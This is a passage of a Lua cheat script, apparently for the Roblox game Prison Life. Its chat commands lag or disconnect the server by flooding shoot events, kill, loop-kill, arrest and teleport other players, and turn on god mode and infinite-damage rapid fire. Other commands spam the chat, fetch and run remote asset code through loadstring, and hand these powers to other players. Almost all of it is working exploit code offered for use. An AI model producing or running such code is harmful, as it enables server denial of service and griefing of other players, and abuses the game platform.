	end
	if Command("lagserver") or Command("disconnect") then
		States.Lag_Server = true
		Notify("Lagging server", Color3.fromRGB(0, 255, 0), "Success")
		while wait() do
			if States.Lag_Server then
				coroutine.wrap(function()
					pcall(function()
						workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)

						local Gun = game.Players.LocalPlayer.Backpack["Remington 870"] or game.Players.LocalPlayer.Character["Remington 870"]

						local args = {
							[1] = {
								["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
								["Distance"] = 0, 
								["Cframe"] = CFrame.new(), 
								["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
							}, [2] = {
								["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
								["Distance"] = 0, 
								["Cframe"] = CFrame.new(), 
								["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
							}, [3] = {
								["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
								["Distance"] = 0, 
								["Cframe"] = CFrame.new(), 
								["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
							}, [4] = {
								["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
								["Distance"] = 0, 
								["Cframe"] = CFrame.new(), 
								["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
							}, [5] = {
								["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
								["Distance"] = 0, 
								["Cframe"] = CFrame.new(), 
								["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
							}, [6] = {
								["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
								["Distance"] = 0, 
								["Cframe"] = CFrame.new(), 
								["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
							}, [7] = {
								["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
								["Distance"] = 0, 
								["Cframe"] = CFrame.new(), 
								["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
							}, [8] = {
								["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
								["Distance"] = 0, 
								["Cframe"] = CFrame.new(), 
								["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
							}
						}

						game:GetService("ReplicatedStorage").ShootEvent:FireServer(args, Gun)
					end)
				end)()
			end
		end
	end
	if Command("unlagserver") or Command("stopdisconnect") or Command("undisconnect") then
		States.Lag_Server = false
		Notify("Unlagging server", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("gravity") or Command("setgravity") then
		local Gravity = tonumber(Arg2)
		if Gravity ~= nil then
			workspace.Gravity = Gravity
			Notify("Changed gravity to "..Gravity, Color3.fromRGB(0, 255, 0), "Success")
		else
			Notify("Count needed", Color3.fromRGB(255, 0, 0), "Error")
		end
	end
	if Command("makecrim") then
		local Player = GetPlayer(Arg2)
		if Player ~= nil then
			Teleport(Player, CFrame.new(-919, 96, 2138))
			Notify("Crimmed "..Player.Name, Color3.fromRGB(0, 255, 0), "Success")
		else
			Notify("No player found", Color3.fromRGB(255, 0, 0), "Error")
		end
	end
	if Command("resetgravity") or Command("regravity") then
		workspace.Gravity = 196.2
		Notify("Resetted gravity", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("resethipheight") or Command("rehipheight") then
		game.Players.LocalPlayer.Character.Humanoid.HipHeight = 0
		Notify("Resetted hip height", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("resetspeed") or Command("respeed") then
		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
		Notify("Resetted walk speed", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("resetjumppower") or Command("rejumppower") then
		game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
		Notify("Resetted jump power", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("leave") or Command("leaveserver") or Command("quit") then
		Notify("Leaving server", Color3.fromRGB(0, 255, 0), "Success")
		wait(.1)
		game:Shutdown()
	end
	if Command("rejoin") or Command("rj") then
		Notify("Rejoining server", Color3.fromRGB(0, 255, 0), "Success")
		wait(.1)
		game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players.LocalPlayer)
	end
	if Command("nodoors") or Command("deletedoors") then
		if workspace:FindFirstChild("Doors") then
			workspace.Doors.Parent = game.Lighting
		end
		Notify("Deleted doors", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("doors") or Command("restoredoors") then
		if game.Lighting:FindFirstChild("Doors") then
			game.Lighting.Doors.Parent = workspace
		end
		Notify("Restored doors", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("nowalls") or Command("deletedoors") then
		pcall(function()
			for i,v in pairs(Walls) do
				v.Parent = game.Lighting
			end
		end)
		Notify("Deleted walls", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("walls") or Command("restorewalls") then
		pcall(function()
			for i,v in pairs(game.Lighting:GetChildren()) do
				if v.Name ~= "Doors" then
					v.Parent = workspace
				end
			end
		end)
		Notify("Restored walls", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("god") or Command("godmode") then
		States.God_Mode = true
		Notify("Turn god mode on", Color3.fromRGB(0, 255, 0), "Success")
		while wait() do
			if States.God_Mode then
				game.Players.LocalPlayer.Character.Humanoid.Name = 1
				local l = game.Players.LocalPlayer.Character["1"]:Clone()
				l.Parent = game.Players.LocalPlayer.Character
				l.Name = "Humanoid"
				game.Players.LocalPlayer.Character.Animate.Disabled = true
				wait()
				game.Players.LocalPlayer.Character.Animate.Disabled = false
				game.Players.LocalPlayer.Character["1"]:Destroy()
				game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
				wait(5)
				local savedcf = GetPos()
				local savedcamcf = GetCamPos()
				local savedteam = GetTeam()
				workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new(savedteam).Name)
				workspace.CurrentCamera.CFrame = savedcamcf
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			end
		end
	end
	if Command("ungod") or Command("ungodmode") then
		States.God_Mode = false
		Notify("Turn god mode off", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("arrest") or Command("handcuffs") then
		local Player = GetPlayer(Arg2)
		if Player ~= nil then
			Arrest(Player, tonumber(Arg3))
			Notify("Arrested "..Player.Name, Color3.fromRGB(0, 255, 0), "Success")
			else
			Notify("No player found", Color3.fromRGB(255, 0, 0), "Error")
		end
	end
	if Command("arrestall") or Command("arrestother") or Command("arrestothers") then
		for i,v in pairs(game.Players:GetPlayers()) do
			if v ~= game.Players.LocalPlayer then
				if v.TeamColor.Name == "Really red" then
					Arrest(v, 30)
				end
			end
		end
		Notify("Arrested all criminals", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("opengate") then
		workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.buttons["Prison Gate"]["Prison Gate"])
		Notify("Opened gate", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("getpos") then
		print("Humanoid Root Part Position :")
		print(game.Players.LocalPlayer.Character.HumanoidRootPart.Position)
		print("Camera CFrame :")
		print(workspace.CurrentCamera.CFrame)
		Notify("Printed positions", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("saveposition") or Command("savepos") then
		States.SavedCFrame = GetPos()
		Notify("Saved positions", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("loadposition") or Command("loadpos") then
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = States.SavedCFrame
		Notify("Loaded positions", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("spamchat") then
		States.SpamChat = true
		Notify("Spamming chat", Color3.fromRGB(0, 255, 0), "Success")
		if tonumber(Arg2) ~= nil then
			States.Spam_Wait = tonumber(Arg2)
		else
			States.Spam_Wait = 1
		end
		while wait() do
			if States.SpamChat then
				local MessagesToChat = {
					"I'm your dad",
					"I'm your mom",
					"I'm a god and I'm your dad",
					"__________",
					"OMG",
					"OML",
					"BEPP BOP BEEP BEEP BOP",
					" ",
					"I'm magic guy because i pressed W,A,S and D on my keyboard and my character can be walked wow, I'M THE REAL MAGIC GUY!",
					"I'M THE MOST PRO IN HERE",
					"I'M A PRO IN THIS SERVER ALL OF YOU ARE NOOB!",
					"LOL XD LOL XD LOL XD",
					"Read my chat",
					"Can you die while you are died?",
					"You know what, I'm a god",
					"Sub to CXZ NAME_R",
					"WOW",
					"wow",
					"\(￣︶￣*\))"
				}

				while true do
					wait(States.Spam_Wait)
					if States.SpamChat then
						pcall(function()
							Chat(MessagesToChat[math.random(1, #MessagesToChat)])
						end)
					end
				end
			end
		end
	end
	if Command("unspamchat") then
		States.SpamChat = false
		Notify("Unspamming chat", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("rapidfire") then
		local Tool = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
		local Name
		local Req
		if Tool then
			Notify("Activated rapid fire", Color3.fromRGB(0, 255, 0), "Success")
			States.CAN = true
			Name = Tool.Name
			if Tool:FindFirstChild("GunStates") then
				Req = require(Tool.GunStates)
				Req["MaxAmmo"] = Req["MaxAmmo"]
				Req["StoredAmmo"] = Req["StoredAmmo"]
				Req["AmmoPerClip"] = Req["AmmoPerClip"]
				Req["CurrentAmmo"] = Req["CurrentAmmo"]
				Req["FireRate"] = -math.huge
				Req["Bullets"] = 25
				Req["Range"] = math.huge
				Req["Damage"] = math.huge
				Req["ReloadTime"] = -math.huge
				Req["AutoFire"] = true
			end
		end
		while wait() do
			pcall(function()
				if game.Players.LocalPlayer.Character:FindFirstChild(Name) and States.CAN then
					if Req["CurrentAmmo"] < 1 then
						Tool:Destroy()
						workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver[Name].ITEMPICKUP)
						Tool = game.Players.LocalPlayer.Backpack:FindFirstChild(Name)
						if Tool then
							Name = Tool.Name
							Tool.Parent = game.Players.LocalPlayer.Character
							Tool = game.Players.LocalPlayer.Character[Name]
							Req = require(Tool.GunStates)
							Req["MaxAmmo"] = Req["MaxAmmo"]
							Req["StoredAmmo"] = Req["StoredAmmo"]
							Req["AmmoPerClip"] = Req["AmmoPerClip"]
							Req["CurrentAmmo"] = Req["CurrentAmmo"]
							Req["FireRate"] = -math.huge
							Req["Bullets"] = 25
							Req["Range"] = math.huge
							Req["Damage"] = math.huge
							Req["ReloadTime"] = -math.huge
							Req["AutoFire"] = true
						end
					end
				end
			end)
		end
	end
	if Command("autorapidfire") then
		States.Auto_RapidFire = true
		Notify("Turn auto rapid fire on", Color3.fromRGB(0, 255, 0), "Success")
		game.Players.LocalPlayer.CharacterAdded:Connect(function()
			game.Players.LocalPlayer.Character.ChildAdded:Connect(function(Item)
				if States.Auto_RapidFire then
					local Tool = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
					local Name
					local Req
					if Tool then
						States.CAN = true
						Name = Tool.Name
						if Tool:FindFirstChild("GunStates") then
							Req = require(Tool.GunStates)
							Req["MaxAmmo"] = Req["MaxAmmo"]
							Req["StoredAmmo"] = Req["StoredAmmo"]
							Req["AmmoPerClip"] = Req["AmmoPerClip"]
							Req["CurrentAmmo"] = Req["CurrentAmmo"]
							Req["FireRate"] = -math.huge
							Req["Bullets"] = 25
							Req["Range"] = math.huge
							Req["Damage"] = math.huge
							Req["ReloadTime"] = -math.huge
							Req["AutoFire"] = true
						end
					end
					while wait() do
						pcall(function()
							if game.Players.LocalPlayer.Character:FindFirstChild(Name) and States.CAN then
								if Req["CurrentAmmo"] < 1 then
									Tool:Destroy()
									workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver[Name].ITEMPICKUP)
									Tool = game.Players.LocalPlayer.Backpack:FindFirstChild(Name)
									if Tool then
										Name = Tool.Name
										Tool.Parent = game.Players.LocalPlayer.Character
										Tool = game.Players.LocalPlayer.Character[Name]
										Req = require(Tool.GunStates)
										Req["MaxAmmo"] = Req["MaxAmmo"]
										Req["StoredAmmo"] = Req["StoredAmmo"]
										Req["AmmoPerClip"] = Req["AmmoPerClip"]
										Req["CurrentAmmo"] = Req["CurrentAmmo"]
										Req["FireRate"] = -math.huge
										Req["Bullets"] = 25
										Req["Range"] = math.huge
										Req["Damage"] = math.huge
										Req["ReloadTime"] = -math.huge
										Req["AutoFire"] = true
									end
								end
							end
						end)
					end
				end
			end)
		end)
		if game.Players.LocalPlayer.TeamColor.Name ~= "Medium stone grey" then
			local savedcf = GetPos()
			local savedcamcf = GetCamPos()
			workspace.Remote.loadchar:InvokeServer()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			workspace.CurrentCamera.CFrame = savedcamcf
		else
			local savedcf = GetPos()
			local savedcamcf = GetCamPos()
			workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Bright orange").Name)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			workspace.CurrentCamera.CFrame = savedcamcf
			workspace.Remote.TeamEvent:FireServer("Medium stone grey")
		end
	end
	if Command("unautorapidfire") then
		States.Auto_RapidFire = false
		if game.Players.LocalPlayer.TeamColor.Name ~= "Medium stone grey" then
			local savedcf = GetPos()
			local savedcamcf = GetCamPos()
			workspace.Remote.loadchar:InvokeServer()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			workspace.CurrentCamera.CFrame = savedcamcf
		else
			local savedcf = GetPos()
			local savedcamcf = GetCamPos()
			workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Bright orange").Name)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			workspace.CurrentCamera.CFrame = savedcamcf
			workspace.Remote.TeamEvent:FireServer("Medium stone grey")
		end
		Notify("Turn auto rapid fire off", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("notifybar") then
		Background4.Visible = true
	end
	if Command("loopbring") then
		local Player = GetPlayer(Arg2)
		if Player ~= nil then
			Notify("Looping bring "..Player.Name, Color3.fromRGB(0, 255, 0), "Success")
			States.PlayerToLoopBring = Player
			States.LoopBring = true
			repeat wait()
				pcall(function()
					if States.LoopBring and game.Players[States.PlayerToLoopBring.Name] then
						local savedcf = GetPos()
						Teleport(States.PlayerToLoopBring, GetPos())
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
					end
				end)
			until States.LoopBring == false
		end
	end
	if Command("unloopbring") then
		States.LoopBring = false
		States.PlayerToLoopBring = nil
		Notify("Unlooping bring", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("admin") or Command("giveadmin") then
		local Player = GetPlayer(Arg2)
		if Player ~= nil and not Admin[Player.UserId] then
			Admin[Player.UserId] = {Player = Player}
			Chat("/w "..Player.Name.." You've got admin permissions! Type "..Prefix.."cmds or "..Prefix.."cmd to see all commands")
			Notify("Gave "..Player.Name.." admin commands", Color3.fromRGB(0, 255, 0), "Success")
		else
			Notify("No player found / already admin", Color3.fromRGB(255, 0, 0), "Error")
		end
	end
	if Command("unadmin") or Command("removeadmin") then
		local Player = GetPlayer(Arg2)
		if Player ~= nil and Admin[Player.UserId] then
			Admin[Player.UserId] = nil
			Chat("/w "..Player.Name.." You are bad you've been removed admin permissions")
			Notify("Removed admins from "..Player.Name, Color3.fromRGB(0, 255, 0), "Success")
		else
			Notify("No player found / already admin", Color3.fromRGB(255, 0, 0), "Error")
		end
	end
	if Command("baseballbat") or Command("bat") then
		local LocalPlayer = game.Players.LocalPlayer
		local Character = LocalPlayer.Character
		local Backpack = LocalPlayer.Backpack
		local Humanoid = Character.Humanoid
		if not Backpack:FindFirstChild("Bat") or not Backpack:FindFirstChild("Bat") then
			local BaseBallBat = Instance.new("Tool", Backpack)
			local Handle = Instance.new("Part", BaseBallBat)
			BaseBallBat.GripPos = Vector3.new(0, -1.15, 0)
			BaseBallBat.Name = "Bat"
			Handle.Name = "Handle"
			Handle.Size = Vector3.new(0.4, 5, 0.4)
			local Animation =Instance.new("Animation", BaseBallBat)
			Animation.AnimationId = "rbxassetid://218504594"
			local Track = Humanoid:LoadAnimation(Animation)
			local Cooldown = false
			local Attacked = false
			local Attacking = false
			BaseBallBat.Equipped:Connect(function()
				BaseBallBat.Activated:Connect(function()
					if not Cooldown then
						Cooldown = true
						Attacking = true
						Track:Play()
						Handle.Touched:Connect(function(Hit)
							if Hit.Parent and Hit.Parent ~= game.Players.LocalPlayer and not Attacked and Attacking then
								Attacked = true
								for i = 1,15 do
									game.ReplicatedStorage.meleeEvent:FireServer(game.Players[Hit.Parent.Name])
								end
							end
						end)
						wait(0.25)
						Cooldown = false
						Attacked = false
						Attacking = false
					end
				end)
			end)
		end
		Notify("Obtained base ball bat", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("tools") or Command("tool") or Command("btool") or Command("btools") then
		local Backpack = game.Players.LocalPlayer.Backpack
		local Character = game.Players.LocalPlayer.Character
		if not Backpack:FindFirstChild("Bin_1") and not Character:FindFirstChild("Bin_1") then
			local HopperBin_1 = Instance.new("HopperBin", Backpack)
			HopperBin_1.BinType = 1
			HopperBin_1.Name = "Bin_1"
		end
		if not Backpack:FindFirstChild("Bin_2") and not Character:FindFirstChild("Bin_2") then
			local HopperBin_2 = Instance.new("HopperBin", Backpack)
			HopperBin_2.BinType = 2
			HopperBin_2.Name = "Bin_2"
		end
		if not Backpack:FindFirstChild("Bin_3") and not Character:FindFirstChild("Bin_3") then
			local HopperBin_3 = Instance.new("HopperBin", Backpack)
			HopperBin_3.BinType = 3
			HopperBin_3.Name = "Bin_3"
		end
		if not Backpack:FindFirstChild("Bin_4") and not Character:FindFirstChild("Bin_4") then
			local HopperBin_4 = Instance.new("HopperBin", Backpack)
			HopperBin_4.BinType = 4
			HopperBin_4.Name = "Bin_4"
		end
		loadstring(game:GetObjects("rbxassetid://552440069")[1].Source)()
		Notify("Obtained btools", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("test") then
		local savedcf = GetPos()
		local CrimPad = workspace["Criminals Spawn"].SpawnLocation
		local padcf = CrimPad.CFrame
		workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Really red").Name)
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CrimPad.CFrame
		wait()
		CrimPad.CFrame = GetPos()
		CrimPad.CanCollide = false
		CrimPad.Transparency = 1.000
		CrimPad.Anchored = true 
		pcall(function()
			for i,v in pairs(game.Teams.Inmates:GetPlayers()) do
				if v ~= game.Players.LocalPlayer then
					CrimPad.CFrame = v.Character.HumanoidRootPart.CFrame
				end
			end
			for i,v in pairs(game.Teams.Guards:GetPlayers()) do
				if v ~= game.Players.LocalPlayer then
					CrimPad.CFrame = v.Character.HumanoidRootPart.CFrame
				end
			end
		end)
		workspace.Remote.loadchar:InvokeServer()
		CrimPad.Transparency = 0.000
		CrimPad.CFrame = padcf
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
		Notify("???", Color3.fromRGB(0, 0, 0), "LOL")
	end
	if Command("antilag") or Command("boostfps") then
		States.BoostFps = true
		Notify("Turn anti lag on", Color3.fromRGB(0, 255, 0), "Success")
		for _, v in pairs(game:GetDescendants()) do
			pcall(function()
				v.Material = Enum.Material.Plastic
				States[v.Name] = {Material = v.Material}
			end)
		end
		while wait() do
			if States.BoostFps then
				for i,v in pairs(game.Players:GetChildren()) do
					if v ~= game.Players.LocalPlayer then
						pcall(function()
							if v.Character.Humanoid.Health < 1 then
								v.Character:Destroy()
							end
						end)
					end
				end
			end
		end
	end
	if Command("unantilag") then
		States.BoostFps = false
		Notify("Turn anti lag off", Color3.fromRGB(0, 255, 0), "Success")
		for _, v in pairs(game:GetDescendants()) do
			pcall(function()
				v.Material = States[v.Name].Material
			end)
		end
	end
	if Command("serverhop") or Command("newserver") or Command("changeserver") then
		Notify("Changing server", Color3.fromRGB(0, 255, 0), "Success")
		wait(.1)
		game:GetService("TeleportService"):Teleport(game.PlaceId)
	end
	if Command("nexus") then
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(888, 100, 2388)
	end
	if Command("cafe") then
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(877, 100, 2256)
	end
	if Command("backnexus") then
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(982, 100, 2334)
	end
	if Command("yard") then
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(791, 98, 2498)
	end
	if Command("crimbase") or Command("criminalbase") then
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-943, 95, 2055)
	end
	if Command("armory") then
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(789, 100, 2260)
	end
	if Command("lunchroom") then
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(905, 100, 2226)
	end
	if Command("gate") then
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(505, 103, 2250)
	end
	if Command("tower") then
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(822, 131, 2588)
	end
	if Command("gatetower") then
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(502, 126, 2306)
	end
	if Command("sewer") then
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(916, 79, 2311)
	end
	if Command("makecrimall") then
		local savedcf = GetPos()
		local CrimPad = workspace["Criminals Spawn"].SpawnLocation
		local padcf = CrimPad.CFrame
		workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Really red").Name)
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CrimPad.CFrame
		wait()
		CrimPad.CFrame = GetPos()
		CrimPad.CanCollide = false
		CrimPad.Transparency = 1.000
		CrimPad.Anchored = true
		repeat wait() 
			pcall(function()
				for i,v in pairs(game.Teams.Inmates:GetPlayers()) do
					if v ~= game.Players.LocalPlayer then
						Teleport(v, CrimPad.CFrame)
					end
				end
				for i,v in pairs(game.Teams.Guards:GetPlayers()) do
					if v ~= game.Players.LocalPlayer then
						Teleport(v, CrimPad.CFrame)
					end
				end
			end)
		until #game.Teams.Criminals:GetPlayers() == (#game.Players:GetPlayers()-#game.Teams.Neutral:GetPlayers())
		workspace.Remote.loadchar:InvokeServer()
		CrimPad.Transparency = 0.000
		CrimPad.CFrame = padcf
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
		Notify("Make everyone crimmed", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("bringall") then
		for i,v in pairs(game.Players:GetPlayers()) do
			if v ~= game.Players.LocalPlayer then
				Teleport(v, GetPos())
			end
		end
		Notify("Broght all", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("notify") then
		States.Notify = true
		Notify("Notify on", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("nonotify") then
		States.Notify = false
		Notify("Notify off", Color3.fromRGB(0, 255, 0), "Success")
	end
	if PrefixCommand("getprefix") then
		Chat("Prefix : "..Prefix)
		Notify("Prefix : "..Prefix, Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("cmd") or Command("cmds") then
		if Background.Visible == true then
			Background.Visible = false
		else
			Background.Visible = true
		end
		Notify("Showed Commands", Color3.fromRGB(0, 255, 0), "Success")
	end

end

function AdminPlayerChatted(Message, Player)
	Split = Message:split(" ")
	Arg1 = Split[1]
	Arg2 = Split[2]
	Arg3 = Split[3]
	Arg4 = Split[4]
	if Command("nexus") then
		Teleport(Player, CFrame.new(888, 100, 2388))
	end
	if Command("cafe") then
		Teleport(Player, CFrame.new(877, 100, 2256))
	end
	if Command("backnexus") then
		Teleport(Player,  CFrame.new(982, 100, 2334))
	end
	if Command("armory") then
		Teleport(Player, CFrame.new(789, 100, 2260))
	end
	if Command("tower") then
		Teleport(Player, CFrame.new(822, 131, 2588))
	end
	if Command("crimbase") or Command("criminalbase") then
		Teleport(Player, CFrame.new(-942, 94, 2055))
	end
	if Command("bring") then
		TeleportV(GetPlayer(Arg2), Player)
	end
	if Command("void") then
		Teleport(GetPlayer(Arg2), CFrame.new(99999, 99999, 99999))
	end
	if Command("beam") then
		Beam(GetPlayer(Arg2), math.huge, 1)
	end
	if Command("yard") then
		Teleport(Player, CFrame.new(791, 98, 2498))
	end
	if Command("disconnect") then
		States.Disconnect = true
		while wait() do
			if States.Disconnect then
				coroutine.wrap(function()
					pcall(function()
						workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)

						local Gun = game.Players.LocalPlayer.Backpack["Remington 870"] or game.Players.LocalPlayer.Character["Remington 870"]

						local args = {
							[1] = {
								["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
								["Distance"] = 0, 
								["Cframe"] = CFrame.new(), 
								["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
							}, [2] = {
								["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
								["Distance"] = 0, 
								["Cframe"] = CFrame.new(), 
								["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
							}, [3] = {
								["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
								["Distance"] = 0, 
								["Cframe"] = CFrame.new(), 
								["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
							}, [4] = {
								["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
								["Distance"] = 0, 
								["Cframe"] = CFrame.new(), 
								["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
							}, [5] = {
								["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
								["Distance"] = 0, 
								["Cframe"] = CFrame.new(), 
								["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
							}, [6] = {
								["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
								["Distance"] = 0, 
								["Cframe"] = CFrame.new(), 
								["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
							}, [7] = {
								["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
								["Distance"] = 0, 
								["Cframe"] = CFrame.new(), 
								["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
							}, [8] = {
								["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
								["Distance"] = 0, 
								["Cframe"] = CFrame.new(), 
								["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
							}
						}

						game:GetService("ReplicatedStorage").ShootEvent:FireServer(args, Gun)
					end)
				end)()
			end
		end
	end
	if Command("undisconnect") then
		States.Disconnect = false
	end
	if Command("spamarrest") then
		local GP = GetPlayer(Arg2)
		if GP then
			States.SpamArrest2 = true
			repeat wait()
				local Time = 0
				pcall(function()
					if GP.TeamColor.Name == "Bright orange" then
						Teleport(GP, GetPos())
						repeat wait(.01)
							Time = Time + 1
							game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = GP.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 1)
							workspace.Remote.arrest:InvokeServer(GP.Character.Head)
						until GP.Character.Head:FindFirstChild("handcuffedGui") or Time >= 250
						if GP.Character.Head:FindFirstChild("handcuffedGui") then
							Arrest(GP, 10000)
						end
					end
					if GP.TeamColor.Name ~= "Really red" and not GP.Character.Head:FindFirstChild("handcuffedGui") then
						if not States.SpamArrest2 then return end
						repeat Teleport(GP, CFrame.new(-919, 96, 2138)) until GP.TeamColor.Name == "Really red" or not States.SpamArrest2 or not game.Players[GP.Name]
					end
					wait(.1)
					if not GP.Character.Head:FindFirstChild("handcuffedGui") then
						Arrest(GP, 10000)
					end
				end)
			until not States.SpamArrest2 or not game.Players[GP.Name]
		end
	end
	if Command("unspamarrest") then
		States.SpamArrest2 = false
	end
	if Command("killguard") or Command("killguards") then
		for i,v in pairs(game.Teams.Guards:GetPlayers()) do
			if v ~= game.Players.LocalPlayer or v ~= Player then
				Kill(v)
			end
		end
	end
	if Command("killinmate") or Command("killinmates") then
		for i,v in pairs(game.Teams.Inmates:GetPlayers()) do
			if v ~= game.Players.LocalPlayer or v ~= Player then
				Kill(v)
			end
		end
	end
	if Command("killcriminal") or Command("killcriminals") then
		for i,v in pairs(game.Teams.Criminals:GetPlayers()) do
			if v ~= game.Players.LocalPlayer or v ~= Player then
				Kill(v)
			end
		end
	end
	if Command("killall") or Command("killothers") then
		for i,v in pairs(game.Players:GetPlayers()) do
			if v ~= game.Players.LocalPlayer or v ~= Player then
				Kill(v)
			end
		end
	end
	if Command("kill") or Command("kills") then
		Kill(GetPlayer(Arg2))
	end
	if Command("loopkill") or Command("loopkills") then
		local Player = GetPlayer(Arg2)
		if Player ~= nil and not LoopKill[Player.UserId] then
			LoopKill[Player.UserId] = {Player = Player}
		end
	end
	if Command("unloopkill") or Command("unloopkills") then
		local Player = GetPlayer(Arg2)
		if Player ~= nil and LoopKill[Player.UserId] then
			LoopKill[Player.UserId] = nil
		end
	end
	if Command("tase") then
		local Player = GetPlayer(Arg2)
		if Player ~= nil then
			Tase(Player)
		end
	end
	if Command("makecrim") then
		Teleport(GetPlayer(Arg2), CFrame.new(-919, 96, 2138))
	end
	if Command("arrest") then
		Arrest(GetPlayer(Arg2))
	end
	if Command("crim") then
		Teleport(Player, CFrame.new(-919, 96, 2138))
	end
	if Command("goto") or Command("to") then
		TeleportV(Player, GetPlayer(Arg2))
	end
	if Command("cmd") or Command("cmds") then
		Chat("/w "..Player.Name.." "..Prefix.."goto [plr] "..Prefix.."to [plr] "..Prefix.."kill [plr] "..Prefix.."kills [plr] "..Prefix.."makecrim [plr] "..Prefix.."arrest [plr] "..Prefix.."tase [plr] "..Prefix.."loopkill [plr] "..Prefix.."unloopkill [plr]") wait(.1)
		Chat("/w "..Player.Name.." "..Prefix.."crim "..Prefix.."tower "..Prefix.."nexus "..Prefix.."backnexus "..Prefix.."cafe "..Prefix.."armory "..Prefix.."bring [plr]") wait(.1)
